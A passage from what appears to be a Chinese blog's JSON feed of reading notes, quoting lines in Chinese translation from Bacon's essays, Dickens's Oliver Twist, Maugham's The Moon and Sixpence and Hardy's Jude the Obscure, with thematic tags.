或者你在宗教观点上，或者他们的习俗上，或者他们的生计上进行干涉，否则他们不会产生什么危险的。</p>\n<p>在一张长桌的上手坐着的几个人，看起来是形式上的东西，但实际上却是实质上的东西，因为实际上那几个人控制着一切的事务。</p>\n<h3 id=\"3-79\"><a class=\"markdownIt-Anchor\" href=\"#3-79\">#</a> 3-79</h3>\n<p>更多的危险与其说是逼迫了人们，毋宁说是欺骗了人们。</p>\n<p>与其长久的注视着某些危险的来临，不如在那些危险走在途中时迎接他们，尽管他们还根本没有逼近。因为一个人如果注视的时间过长，也就可能睡着。</p>\n<p>在一个国家里，危害最烈的，莫过于狡猾的人被当作聪明的人了。</p>\n<p>有一些人，他们只知道事情的盛衰沉浮，但却不能深入到事情的中心。他们在结论中找到了走出困境的途径，但却完全不能对事情进行检查和争论。然而他们通常是因为无能而获得了利益，并且会被认为是具有指导事务天赋的才子。</p>\n<p>对反常的人来说，恶有着一种自然的运行，而且在持续的时候运动最为有力；但是善，作为一种被迫的运动，却是一开始的时候最有力。</p>\n<p>凡是由习俗所确立的东西，尽管可能不好，但起码也是合适的。</p>\n<p>任何新的事物都会是始料不及的；而且它又总是既有所改善、又有所损害。</p>\n<p>我们应该站在古道上，然后四下张望，发现哪一条是笔直的正确的路，便可走到哪里。</p>\n<p>有些人就智慧和能力而言可以说是一无是处，却又非常认真，“以巨大的努力生产出毫无价值的东西”。</p>\n<p>在他们心里明白他们说的是自己并不很懂的事情的时候，他们却想在别人的面前表现出，他们不是不懂，而是不想明白说。</p>\n<p>喜欢孤独的人不是野兽便是神。</p>\n<p>若是说，对社会的一种天生的和秘而不宣的仇恨和厌恶，不论是在谁身上，都多少带有野蛮的兽性，这是非常正确的；但若是说这种仇恨和厌恶竟会是有神圣的性质，则又是最不正确的，除非它并不是来自在孤独中的满足，而是来自一种爱好和欲望，那是为了获得一种更高的生活方式而隐居。</p>\n<p>如果没有爱，那么人群也就并非同伴，一张张面孔也就只不过是图片的画廊、交谈也只不过是叮当作响而已。</p>\n<h3 id=\"3-80\"><a class=\"markdownIt-Anchor\" href=\"#3-80\">#</a> 3-80</h3>\n<p>一个人与其让他的思想在窒息中消失，不如把他的思想向雕像或者图画倾诉。</p>\n<p>一个人通过另外一个人的忠告而获得的光，与通过他本人的理解和判断所获得得光相比，要更加干燥和纯粹，因为通过他本人的理解和判断所获得的光，总是充满和浸透着他的感情和习惯。</p>\n<p>由于过高估计他们的力量，而在愚蠢的事业中迷失自我；由于低估自己的力量，而堕落到听从恐惧而又怯懦的意见。</p>\n<p>对于任何一个国家来说，如果对任何正义的动武理由都麻木不仁，就别指望他伟大。</p>\n<p>在一种怠惰的和平中，民气将变得柔弱，民风就变得腐败。</p>\n<p>健康长寿一个最重要的准则，就是人应该对相反的事物进行改变和互换，但在改变和互换的时候应倾向于那个更为温和的极端。</p>\n<p>最能使人多疑的，莫过于所知甚少。因而人们若是想消除怀疑，就应该设法多了解情况，而不是压制怀疑。</p>\n<p>慎言比雄辩更为重要，以合适的方式与所打交道的人讲话，比言辞优美或者有条有理更为重要。</p>\n<p>财富在有钱人的想象中，就像一座堡垒一样。但那个堡垒存在于想象之中，而并非总是存在于事实之中。</p>\n<p>虚荣的赠予和基金，就好像 “没有盐的祭品” 一样，只不过是为善举的粉刷过的坟墓而已，很快就会从里面腐烂坏死。</p>\n<p>他们若是没有因他们的功劳而升迁的话，便会把事情安排得让他们的工作与他们一起堕落。</p>\n<p>天性往往被掩盖起来，有时被压倒，但很少被消灭掉。压抑天性，则使天性返回之时更加强烈；教诲和交谈，能使天性不那么令人烦恼；但只有习惯，才能改变和制服天性。</p>\n<p>不应无休止的持续把一种习惯强加给自己，而应该有某种间歇。这既是因为，停顿能使新的开始更为有力；而且，也是因为，如果一个人并不完美，却又总是在实践，那么他就必实践他的能力，也实践他的错误，并因而产生一种能力和错误兼而有之的习惯。</p>\n<h3 id=\"3-81\"><a class=\"markdownIt-Anchor\" href=\"#3-81\">#</a> 3-81</h3>\n<p>凡是与自己的天性不相适合的学科，应给它规定下时间来；但凡与自己天性相适应的，则不必费心规定时间，因为思绪会自发地飞向那个学科，只要用于别的工作或学习上的时间够用就行。人的天性不是长成药草，就是长成杂草。</p>\n<p>人们的思想多是与他们的倾向相一致，言谈话语多是与他们的学问与被灌输的见解相一致，但他们的所作所为，却是与他们的习惯相一致。</p>\n<p>不管是天性，还是话语的保证，都不如习惯有力量。</p>\n<p>他们就好像是无生命的塑像和器械一般，只是被习惯的轮子给推动着。</p>\n<p>如果一个人敏锐而又全神贯注观看的话，他就一定会看见命运女神，因为尽管她是盲目的，她却并不是隐形的。</p>\n<p>极端热爱他们国家或者主人的人，从来就不是幸运的，而且他们也不能够幸运。因为当一个人把他自己的思想置于己身之外的时候，他就不是按自己的路走了。</p>\n<p>他度过了一个充满了愚行的青年时代，更精确地说一个愚蠢至极的青年时代。</p>\n<p>老年人的忠告，在于其范围之内的事务中，是指导的；而在新的事物中，却是误导的。</p>\n<p>在学习上花费太多的时间，是延误；把学问用于过多的增添光彩，是矫情；完全按照书本上的规则来判断，则是学者的怪癖。学习改善天性，经验又改善学习；而学问本身，若没有被经验所束缚，则所给予的指示就未免过于笼统。</p>\n<p>读书的目的，并不是为了提出相反意见和进行驳斥；也不是为了尽信书中所言，将其视为理所当然；也不是为了找到谈资和交谈能力；而是为了在心中进行衡量与斟酌。</p>\n<p>一切炫耀都是依赖于比较，他们一定是狂热的，那是为了证明他们的大话。</p>\n<p>谎言足以产生舆论，而舆论又导致实体的产生。</p>\n<h3 id=\"3-82\"><a class=\"markdownIt-Anchor\" href=\"#3-82\">#</a> 3-82</h3>\n<p>我们知道，这个法律只要得到合法的使用，就是好的法律。</p>\n<p>愤怒就像倾废的建筑物，它是在塌落处自己垮掉的。</p>\n<p>在忍耐中拥有我们的灵魂，不论是谁，只要失去了耐性也就失去了灵魂。</p>\n<p>不管你怎样表现出愤懑，你都不可做出任何不可挽回的事情。</p>\n",
            "tags": [
                "意义",
                "人生哲学",
                "道德"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/33%E3%80%8A%E9%9B%BE%E9%83%BD%E5%AD%A4%E5%84%BF%E3%80%8B%E7%8B%84%E6%9B%B4%E6%96%AF/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/33%E3%80%8A%E9%9B%BE%E9%83%BD%E5%AD%A4%E5%84%BF%E3%80%8B%E7%8B%84%E6%9B%B4%E6%96%AF/",
            "title": "《雾都孤儿》狄更斯",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>当初影响我的理由，现在同样影响着我。</p>\n<h3 id=\"3-90\"><a class=\"markdownIt-Anchor\" href=\"#3-90\">#</a> 3-90</h3>\n<p>他不时颤栗着惊醒，身子往墙上贴的越来越紧，他仿佛感到，当黑暗与孤独四面袭来时，那一层冰冷坚硬的墙面也成了一道屏障。</p>\n<p>不管是哲学还是政治经济学，他们也就懂那么一点点，就那么点。</p>\n<p>水沟阻塞不通，恶臭难闻，正在糜烂的老鼠，东一只西一只，就连他们也是一副可怕的恶相。</p>\n<p>他曾面带蔑视的表情听凭人们嘲弄，一声不吭的忍受鞭笞毒打，因为他感觉得到，自己内心有一种正在成长的尊严，有了这种尊严，他才坚持到最后。</p>\n<p>这事奥利弗生平第一次听到别人为他祈祷，他往后还将历尽磨劫熬煎，饱尝酸甜苦辣，但他没有一时一刻遗忘过这些话语。</p>\n<p>一般来说，在沉睡和清醒中间存在着一种盹困恍惚的状态，眼睛半睁半闭，对周围发生的事物似醒非醒，在短短五分钟里梦见的东西比起五个晚上紧闭双眼，对一切浑然不觉中所梦见的还要多。</p>\n<p>有几张脸长眠在地下，已经变了样，可是心灵超越了死亡，使他们依旧像昔日一样美好，呼唤着当年炯炯的目光，透过躯壳的灵魂之光，仿佛在娓娓低语，黄土底下的美虽已面目全非，但却得到了升华。</p>\n<p>在这四壁之内，荒唐得足以叫天使们哭瞎双眼的把戏日复一日，衍演无穷，这一切对公众却始终是秘而不宣的。</p>\n<h3 id=\"3-91\"><a class=\"markdownIt-Anchor\" href=\"#3-91\">#</a> 3-91</h3>\n<p>他们这样做，是基于一种十分得体而又非常值得钦佩的想法，那就是只顾自己。</p>\n<p>许多哲学大师在实施他们的理论时都表现出了深谋远虑，他们能够排除一切可能出现的、完全可以估计到的、于他们不利的偶然因素。</p>\n<p>我曾倾注满腔爱心的那群人已经长眠在黄泉之下，我平生的幸福与欢乐也埋在了那里，不过从内心感情来说，我还没有把我的这颗心做成一口棺材，永远封闭起来。</p>\n<p>夜幕已经降临，这儿又是一个不讲理的地方，孑然一生，反抗是徒劳的。</p>\n<p>实际生活中，从摆满珍饶美馔的餐桌到临终时的灵床，从吊丧的孝服到节日的盛装，这种变迁的惊人之处也毫不逊色，只不过我们就是其中匆匆来去的演员，而不是袖手旁观的看客罢了。</p>\n<p>我很高兴，我还没长大的时候就死了。</p>\n<p>他已经又了体验，当无辜和有罪偶然交织在一起的时候，连司法当局也可能将其混为一谈。对于如何除掉知道的太多或者是过分藏不住话的家伙，老犹太藻油深谋老算，这类计划他不止一次设计并且实施过了。</p>\n<p>在这漫长的时间里，与他作伴的只有他自己的浮想。</p>\n<p>他用孤独与抑郁去熏陶奥利弗的心，让他感到在这样一个阴森凄凉的地方，与随便什么人为伍都比独自沉浸在忧愁苦恼中好受一点，他现在正将毒汁缓慢的注入奥利弗的灵魂。</p>\n<p>她们最大的毛病就是，一件小事也会唤醒某种早忘的干干净净的感情。</p>\n<p>小奥利弗早就逆来顺受惯了，呆在这里也吃尽了苦头，面对瞬息万变的前景，他就是想哭也哭不出来。</p>\n<p>无家可归、饥寒交迫的人们则注定只有倒毙路旁的命运。多少备受饥饿折磨的流浪者在我们那些空荡荡的街头巷尾闭上了双眼。就算他们罪有应得吧，反正他们再也不会睁开眼睛来看一个更为悲惨的世界。</p>\n<h3 id=\"3-92\"><a class=\"markdownIt-Anchor\" href=\"#3-92\">#</a> 3-92</h3>\n<p>当然嫌不够咯，邦布尔先生，他们什么时候满足过？</p>\n<p>街头救济的首要原则就是，专拣穷小子们不需要的东西给他们，然后他们就再也想不来了。</p>\n<p>世间的操劳，悲哀，饥饿，可以改变人们的心灵，也会改变人们的面容。只有当种种烦恼逝去，永远失去了他们的控制力的时候，翻覆汹涌的云层才会消散，留下清朗的天颜。</p>\n<p>这些崇拜者脸上流露出的邪恶表情几乎可以说应有尽有，而且几乎是每一个阶段的都有，正是他们脸上这种可憎可恶的表情让人非看一眼不可。他们脸上的奸诈、凶恶和不同程度的醉态都表现的淋漓尽致。</p>\n<p>天将破晓，第一抹暗淡模糊的色彩 ----- 与其说这是白昼的诞生，不如说是黑夜的死亡 ---- 软弱无力地在空中闪射着微光，空气变得分外淋漓刺骨。</p>\n<p>尽管急雨打在身上，奥利弗却没有感觉到，他仍然直挺挺地躺在自己的泥土床上，无依无靠，不省人事。</p>\n<p>他脑子里一片晕眩，像醉汉一样踉踉苍苍走了几步。尽管如此，他还是坚持住了，脑袋软软地耷拉在胸前，磕磕绊绊朝前走去，究竟去哪儿，他自己也不知道。</p>\n<p>有的时候，一支亲切的乐曲，一处幽静地方的潺潺水声，一朵花的芳香，甚而只是说出一个熟悉的字眼，会突然唤起一些模糊的记忆，令人想起一些今生不曾出现过的场景，他们会像微风一样飘散，仿佛刹那间唤醒了某种久以离别的，比较快乐的往事，而这种回忆单靠闵思苦想是怎么也想不出来的。</p>\n<p>罪恶，在许多神圣的场所都可以藏身。谁能说一身漂亮的外表就不会死藏祸心？犯罪，如同死亡一样，并不是单单照顾年老体弱的人。最年轻，最漂亮的也经常成为它选中的牺牲品。</p>\n<h3 id=\"3-93\"><a class=\"markdownIt-Anchor\" href=\"#3-93\">#</a> 3-93</h3>\n<p>呵！当我们压迫蹂躏自己的同类时，我们何不想一想，人类作孽的罪证如同浓重的阴云，尽管升腾十分缓慢，但难逃天网，最后最后总有恶报倾注在我们头上 ---- 我们何不在想象中听一听死者发出的悲愤的控诉，任何力量也无法压制，任何尊严也无法封锁的控诉 ----- 哪怕只是稍微想一想，听一听，那么每天每日的生活所带来的伤害、不义、磨难、痛苦、暴行和冤屈，那里还会有落脚之处！</p>\n<p>你们的眼睛，对任何问题都只看到了一个方面，无论是好是坏，就是说，总是盯住最先出现在眼前的东西。</p>\n<p>我们的目的是高尚的，我们这样做也就情有可原。</p>\n<p>事实上，这位出色的一生一辈子办事都是凭一时冲动，这里可以对支配他的种种冲动说一句不带恶意的恭维话，他非但从来没有被卷进任何特别的麻烦或者倒霉的事情中去，反而从所有认识他的人那里得到极为真诚的推崇和敬重。</p>\n<p>习惯成了他们的第二天性，他们几乎可以说爱上了组成他们日常漫步的狭小天地的一砖一石。</p>\n<p>在这一切之下，在每颗心灵中就算是最麻木的心灵，一个模糊不清、尚未完全形成的意识，很久之前，在某个相隔遥远的时刻，就有过这种感觉的意识，始终流连不去，启迪人们庄重的瞩目遥远的未来，将傲慢与俗念压在它的下面。</p>\n<p>有一个世界别这个要光明一些，并且到那里也用不了多少时间。</p>\n<p>有那么多的事情受到忽视，办到的事情又是那样少 ---- 有那么多事情被遗忘，还有更多的事情已无法挽回 ---- 因而我们必须留心，平时我们如何去对待我们周围的人！没有什么比悔之莫及更令人懊恼的了。</p>\n<p>年轻人有许多高尚的冲动往往难以持久，其中有一些一旦得到满足，只会变得更加短暂，转瞬即逝。总之，我相信。</p>\n<h3 id=\"3-94\"><a class=\"markdownIt-Anchor\" href=\"#3-94\">#</a> 3-94</h3>\n<p>人们看到天地万物和自己的人类同胞，大叫一切都是那样的阴暗，消沉，这并非没有道理，但这种阴暗的颜色只是他们自己带有偏见的眼睛与心灵的反映罢了。真实的色彩是十分美妙的，需要的是更加清澈的眼光。</p>\n<p>跟大部分事情一样，怪事如果得不到新的养料，往往自身自灭。</p>\n<p>我曾用由于渴望和深情而变得近乎盲目的眼睛，注视着你死里逃生。要知道，正是这份深情使我的心变软了，改变了我对全人类的态度。</p>\n<p>知道我曾经在你的心目中占据了这样崇高的位置，你在生活中取得每一个胜利都将赋予我新的毅力，使我变得更加坚定，这就是幸福。</p>\n<p>我的名字上有一个污点，而世人却要用来殃及无辜。</p>\n<p>这种软弱我没法克制，但它总是使我的心意变得更加坚定。</p>\n<p>他明摆着有一种欺负弱者的嗜好，并从中得到绝非微不足道的快乐。</p>\n<p>这世界上从来都不存在什么雨，或者将来下的雨，能浇灭人心头的欲望之火，正如浇不灭地狱之火一样。</p>\n<p>这个世道，规矩人真不做不得，破铜烂铁也比用火炼过的金子值钱。</p>\n<p>我不明白是怎么回事，我只知道本来就是这样，不光我一个人，还有成百上千个和我一样堕落的苦命人也是这样。我必须回去。</p>\n<p>我一直生活在地狱里，死后能够不进那个地狱，已经很不错了。</p>\n<p>我心甘情愿的留在这里，就算呆上一年半载吧，只要你们能叫我相信，事情还没有完全绝望。</p>\n<p>每一样有生命的东西都带着罪恶或者贫穷的痕迹，要不就是与二者有接触，一些没有生命的物体则在一旁皱眉观望。上面积了一层油腻腻的污土之后，二者相比，差不多同样令人不快。</p>\n<p>他那些恶言冷语给费金造成的伤害虽然看不见，但产生的刻骨仇恨并没有因此而减轻。</p>\n<p>那些好人，在和尘世的摩擦中似乎连笑容也给抹掉了，总是一成不变的面向天国最黑暗的一侧。如果我在异教徒和伪君子之间做一个选择的话，我宁可选择前者。</p>\n<h3 id=\"3-95\"><a class=\"markdownIt-Anchor\" href=\"#3-95\">#</a> 3-95</h3>\n<p>我是个骗子，从小生活在骗子中间。但我相信你的话。</p>\n<p>我与过去的生活是用链条拴在一起的。我现在讨厌他，恨他，但离不开他，我只能走到再也回不来的地步才算了事。</p>\n<p>他游荡了不知多少里路，又回到了老地方，早晨与中午已经过去了，白昼即将开始，他仍然在东游西荡，上坡下坡，兜了一圈又一圈，始终在原地徘徊。</p>\n<p>他摆脱了记忆，也摆脱了他自己，一头扎进最稠密的人群之中。</p>\n<p>那一场阴差阳错的结合带来的是灾难，慢性折磨，无休止的苦恼。我知道那不幸的一对各自套着沉重的枷锁，度日如年，过得何等的厌倦。</p>\n<p>他死了，世间的苛责或是宽厚对他在没有什么两样。</p>\n<p>邪念、罪孽、淫欲，这一切都在你身上溃烂，直到它们找到一种可怕的病态才算发泄出来，这种病态甚而把你的面孔变成了你的灵魂的一个缩影。</p>\n<p>墙上的影子听见了你们的窃窃私语，把你们的话传到了我的耳边。</p>\n<p>当初影响我的理由，现在同样影响着我。</p>\n<p>现在，我要奉献给你的，绝非芸芸众生之间的显赫名声，也不是在和充满怨恨和诽谤的世道同流合污，在这个世道上，正直的人抬不起头，往往并不是因为他们真正干了什么可耻的事。我献给你的不过是一个家。</p>\n<p>这是一个希望动辄破灭的世界，对于我们极为珍视的希望，可以给我们的天性带来最高荣誉的希望，经常都是这样。</p>\n<p>他漫不经心的想着这一连串的念头，直到某一新的物种映入他的眼帘，就又顺着另一条思路胡思乱想。</p>\n<p>他醒着坐在那里，却又在做梦。</p>\n",
            "tags": [
                "社会",
                "人性"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/34%E3%80%8A%E6%9C%88%E4%BA%AE%E5%92%8C%E5%85%AD%E4%BE%BF%E5%A3%AB%E3%80%8B%E6%AF%9B%E5%A7%86/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/34%E3%80%8A%E6%9C%88%E4%BA%AE%E5%92%8C%E5%85%AD%E4%BE%BF%E5%A3%AB%E3%80%8B%E6%AF%9B%E5%A7%86/",
            "title": "《月亮和六便士》毛姆",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>一般人都不是他们想要做的那种人，而是他们不得不做的那种人。</p>\n<h3 id=\"3-96\"><a class=\"markdownIt-Anchor\" href=\"#3-96\">#</a> 3-96</h3>\n<p>一部好的作品，应不做多说教，少指伦理是非，一切留给读者自己判断。</p>\n<p>我所谓的伟大不是走鸿运的政治家或是立战功的军人的伟大：这种人显赫一时，与其说是他们本身的特质，倒不如说沾了他们地位的光，一旦时过境迁，他们的伟大也就黯然失色了。</p>\n<p>他的生活中有不少离奇可怕的行径，他的性格里有不少荒谬绝伦的怪癖，他的命运中又不乏悲怆的遭遇。</p>\n<p>但他的目光敏锐，一眼就望穿了隐含在一些天真无邪的行为下可鄙的动机。探索用心灵秘密的人能够看到不好用言语表达出来的东西，心理病学家却看到了根本不能表达的事物。</p>\n<p>为了使灵魂宁静，一个人每天要做两件他不喜欢的事。说这句话的人是个聪明人，我也一直在一丝不苟的按照这条格言行事：因为每天早上我都起床，每天也都上床睡觉。</p>\n<p>作者应该从写作的乐趣中，从郁积在他心头的思想的发泄中取得写书的酬报；对于其他的一切都不应该介意，作品成功或失败，受到称赞或是诋毁，他都应该淡然处之。</p>\n<p>她为自己创造了一个幻想的小天地，生活在其中，感到日常生活中所无从享受的自由。</p>\n<p>文明社会这样消磨自己的心智，把短促的生命浪费在无聊的应酬上实在令人费解。这些人见面时冷冷淡淡，分手时更有一种如释重负的感觉。</p>\n<p>他只不过是一个忠厚老实，索然无味的普通人。</p>\n<p>这种安详宁静的快乐好像有一种叫我惊惧不安的东西。我的心渴望一种更加惊险的生活。只要在我的生活中能有变迁 — 变迁和无法预见的刺激，我是准备踏上怪石嶙峋的山崖，奔赴暗礁满布的沙滩的。</p>\n<p>有些人的生活只是社会有机体的一部分，他们只能生活在这个有机体内，也只能依靠它而生活，这种人总是给人以虚幻的感觉。</p>\n<h3 id=\"3-97\"><a class=\"markdownIt-Anchor\" href=\"#3-97\">#</a> 3-97</h3>\n<p>女人一种无法摆脱的恶习 — 热衷于同任何一个愿意倾听的人谈论自己的私事。</p>\n<p>当您年纪在长几岁的时候，肯定就会懂得不该管别人的闲事了。</p>\n<p>人性的矛盾，真挚中也有做作，高尚中含有卑鄙，或者，在邪恶里也看得到美德。</p>\n<p>我好像感觉到一种猛烈的力量正在他的身体里奋力挣扎；我觉得这种力量非常强大，压倒一切，仿佛违拗着他自己的意志，并把他紧紧抓在手中。</p>\n<p>他当时根本什么也看不到，他看到的只是搅动着他灵魂的一些幻景。</p>\n<p>我总觉得事事要邀获别人批准，或许是文明人类最根深蒂固的一种天性。</p>\n<p>人们说服自己，相信某种利益大于个人利益，甘心为他效劳，结果沦为这个主子的奴隶。</p>\n<p>卑鄙与伟大，恶毒与善良，仇恨与热爱是可以互不排斥地并存在同一颗心里的。</p>\n<p>天天做的事几乎一摸一样，使我感到厌烦的要命。我的朋友们过着老一套的生活，平淡无奇，再也引不起我的好奇心了。有时候，我们见了面，不待他们开口，我就知道他们要说什么话。</p>\n<p>叫人做出高尚行动的有时候反而是幸福得意，灾难不幸在大多数情况下只能使人们变得心胸狭小，报复心更强。</p>\n<p>我的生活只不过是每日辛勤工作，没有什么奇闻艳遇。在不同的方向进行了摸索实验；我逐渐积累了不少书本知识和人情世故。</p>\n<p>他在追求一种我不太清楚的东西，或许连他自己也知道地并不清楚。他像是一个被什么迷住了的人，他的心智好像不很正常。他生活在幻梦里，现实对他一点意义也没有。</p>\n<p>如果你不在乎某一个人对你的看法，一群人对你有什么意见又有什么关系？</p>\n<p>有一些人很不幸，即使他们流露的是最真挚的感情也令人感到滑稽可笑。</p>\n<p>我预见他的结局将是遭受痛苦的折磨和绝望。我心里又产生了一种他被魔鬼附体的感觉；但你却不能说这是邪恶的魔鬼，因为这是在宇宙混沌、善恶未分之前就存在的一种原始的力量。</p>\n<h3 id=\"3-98\"><a class=\"markdownIt-Anchor\" href=\"#3-98\">#</a> 3-98</h3>\n<p>她是睁着眼睛自己走开的，如果她不得部吃些苦口，也是自找。</p>\n<p>我觉得，在爱情的事上如果考虑起自尊心来，那就只有一个原因：实际上你还是最爱自己。</p>\n<p>我要杀死他，结果却徒然使自己出丑。</p>\n<p>这种感情是什么呢？它只不过是对有保障的生活的满足，对拥有家资的骄傲，对有人需要自己沾沾自喜，对自己建立的家庭洋洋得意而已；女人们秉性善良、喜爱虚荣，因此便认为这种感情极富于精神价值。但是在冲动的热情前面，这种感情是毫无防卫能力的。</p>\n<p>爱情赋予他明知是虚幻的事物以实物形体，他明知这一切不过是镜花水月，爱它却远远超过喜爱真实。他不再是一个人，他成了追求某一个他不了解的目的的一件事物、一个工具。</p>\n<p>他从来不能忍受外界加给他的任何桎浩，如果有任何食物妨碍了他那无人能理解的渴望（这种热烈无时或止地刺激着他，叫他自己奔向一个他也不清楚的目标），我相信他会毫不犹豫把它从心头上连根拔去，即使忍受莫大痛苦，弄得遍体鳞伤，鲜血淋漓也在在所不惜。</p>\n<p>他希望别人同情他，但是却只引起了人们的嘲笑。</p>\n<p>大自然在创造这个人的时候，在他身上揉捏了这么多相互矛盾的特点，叫他面对着令他迷惑不解的冷酷人世，这是一个多么残忍的玩笑啊。</p>\n<p>她的面孔宛如一副面具，我在那上面丝毫也看不出她的真实思想。</p>\n<p>生活的经验让我们看到的是，尽管人们不断做一些必然招灾惹祸的事，但总能找个机会逃避掉这些愚蠢事带来的后果。</p>\n<p>他的嘴唇动了动，好像在说什么，但是什么声音也没有发出来。他像个白痴似的胡乱的说一了些没有意义的话。</p>\n<p>这双眼睛曾经看到过人世的一切恐怖和痛苦，但是因为那里面装的是一个没有罪恶的世界的幻景，所以她的目光是清澈的。</p>\n<h3 id=\"3-99\"><a class=\"markdownIt-Anchor\" href=\"#3-99\">#</a> 3-99</h3>\n<p>文明日新月异，这个小城却好像被抛在后面，永远也不会发生什么事情，如此年复一年，直到死亡最后来临，像个老友似的给那些勤苦劳动一生的人带来永久的安息。</p>\n<p>世间是无情的、残酷的。我们生到人世间没有人知道为了什么，我们死后没有人知道到何处去。我们必须自甘卑屈。我们必须看到冷清寂寥的美妙。我们应当去寻找那些淳朴、敦厚的人的爱情。他们的愚昧远比我们的知识更为可贵。让我们保持沉默，满足于自己的小天地，像他们一样平易温顺吧。这就是生活的智慧。</p>\n<p>我好像被带进一个全部事物的价值都改变了的世界里。我茫然不知所措的站在一旁，好像到了一个异乡的陌生人，在那里，一个人对她所熟悉的事物的各种反应都与过去不同了。</p>\n<p>他们用以遮饰自己毫无价值的思想的夸大使他们的感受力变得迟钝不堪。</p>\n<p>在文明的社会中，风俗礼仪迫使这种天性隐匿到潜意识的最隐秘的底层下，给予他虚构的人物以血肉之躯，也就是使他那一部分无法表露的自我有了生命。他得到的满足是一种自由解放的快感。</p>\n<p>女人可以原谅男人对他的伤害，但是永远不能原谅他对她作出的牺牲。</p>\n<p>她以无限的耐心准备把我网罗住，捆住我的手脚。她要把我拉到她的那个水平上；她对我这个人一点儿也不关心，唯一想的是叫我依附于她。</p>\n<p>人们继续活下去，谁也没有因为这个悲剧而活的更糟。</p>\n<p>生命并没有什么价值，一切都是空虚的，没有意义的。</p>\n<p>他一动不动地站在我的面前，眼睛里闪着讥嘲的笑容。但是尽管她脸上是这种神情，一瞬间我好像还是看到了一个受折磨的、炽热的灵魂正在追逐某种远非血肉之躯所能想象的伟大的东西。</p>\n<p>它们引起我一种无法分析的感情。他们诉说着一种语言无力表达的事。我猜想，斯特里科兰特在有形的事物上模模糊糊的看到某种精神意义，这种意义非常奇异，他只能用很不完善的符号把他表达出来。</p>\n<h3 id=\"3-100\"><a class=\"markdownIt-Anchor\" href=\"#3-100\">#</a> 3-100</h3>\n<p>我们每个人生在世界上都是孤独的。每个人都被囚禁在一座铁塔里，只能靠一些符号同别人传达自己的思想，而这些符号并没有共同的价值，因此他们的意义是模糊的，不确定的。</p>\n<p>我们非常可怜的想把自己心中的财富传送给别人，但是他们却没有接受这些财富的能力。因此我们只能孤独的行走，尽管身体互相依傍却并不在一起，既不了解别人也不能被别人所了解。</p>\n<p>他根本不考虑真实状况，因为他要在一堆互不相关的偶然的现象下面寻找他自己感到意义重大的事物。他好像已经抓到了宇宙的灵魂，一定要把它表现出来不可。</p>\n<p>我觉得你很像一个终生跋涉的香客，不停的寻找一座可能根本不存在的神庙。也许你寻找的真理同自由，在一个短暂的时间里你认为或许能在爱情中获得解脱。但你没能找到，你就开始恨她了。</p>\n<p>或许一个人如果想要体会到生活中的浪漫激情就必须在某种程度上是一个演员；而要想跳出自身之外，则必须能够对自己的行动抱着一种既超然物外又沉浸于其中的兴趣。</p>\n<p>他的灵魂追求的是另外一种东西。他的感情非常强烈，有时候欲念会把他抓住，逼得他纵情狂欢一阵，但是对这种剥夺了他宁静自持的本能他是非常厌恶的。</p>\n<p>生活不过是一片混乱，充满了各种可笑的，龌龊的事情，它只能给人们提供笑料，但是他笑的时候却禁不住满心哀伤。</p>\n<p>你觉得有一种人们并不了解的原始力量又让你厌恶，又深深的把你迷住。在这里，一切文明、体面已荡然无存，人们面对着的只是阴郁的现实，一种既热爱又悲哀的气氛笼罩着一切。</p>\n<h3 id=\"3-101\"><a class=\"markdownIt-Anchor\" href=\"#3-101\">#</a> 3-101</h3>\n<p>在出生的地方他们好像是过客。这种人在自己亲友中可能终生落落寡合，在他们唯一熟悉的环境里也始终孑然独处。说不定在他们内心深处仍然隐伏着多少世代前祖先的习性和癖好，叫这些彷徨者再回到他们祖先在远古就已离开的土地。</p>\n<p>在我看来，一个人因为看到另外一种生活方式更有重大的意义，只经过半小时的考虑就甘愿抛弃一生的事业前途，这才需要很强大的个性呢。</p>\n<p>做自己想做的事，生活在自己喜爱的环境里，淡泊宁静、与世无争。这难道是糟蹋自己吗？与此相反，做一个著名的外科医生，年薪一万镑，娶一位美丽的妻子，就是成功吗？我想，这一切都取决于一个人如何看待生活的意义，取决于他认为对社会应尽什么义务，对自己有什么要求。</p>\n<p>他就住在那里，不关心世界上的事，世界也把他完全遗忘。</p>\n<p>一般人都不是他们想要做的那种人，而是他们不得不做的那种人。</p>\n<p>世人有些人渴望寻获真理，他们的要求非常强烈，为了达到这个目的，就是叫他们把生命的基础完全打翻，也在所不惜。</p>\n<p>人们都是这样的，恐惧使人们变得残酷无情。</p>\n<p>你被一种无形的恐怖握在掌心，无法逃脱。</p>\n",
            "tags": [
                "成长",
                "命运"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/37%E3%80%8A%E6%97%A0%E5%90%8D%E7%9A%84%E8%A3%98%E5%BE%B7%E3%80%8B%E6%89%98%E9%A9%AC%E6%96%AF%C2%B7%E5%93%88%E4%BB%A3/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/37%E3%80%8A%E6%97%A0%E5%90%8D%E7%9A%84%E8%A3%98%E5%BE%B7%E3%80%8B%E6%89%98%E9%A9%AC%E6%96%AF%C2%B7%E5%93%88%E4%BB%A3/",
            "title": "《无名的裘德》托马斯·哈代",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>除了自己的灵魂，他无任何指路之星。</p>\n<h3 id=\"3-109\"><a class=\"markdownIt-Anchor\" href=\"#3-109\">#</a> 3-109</h3>\n<p>它们似乎和他一样，生活在一个不需要它们的世界里。</p>\n<p>他是那样生来就要受尽痛苦，直至结束无用的生命才能脱离苦海的人。</p>\n<p>你的周围似乎都是些令人炫目、五光十色，吵闹不止的东西，他们的杂声和强光撞击在你那叫做生命的小小细胞上，猛烈地震动它使它变形。</p>\n<h3 id=\"3-110\"><a class=\"markdownIt-Anchor\" href=\"#3-110\">#</a> 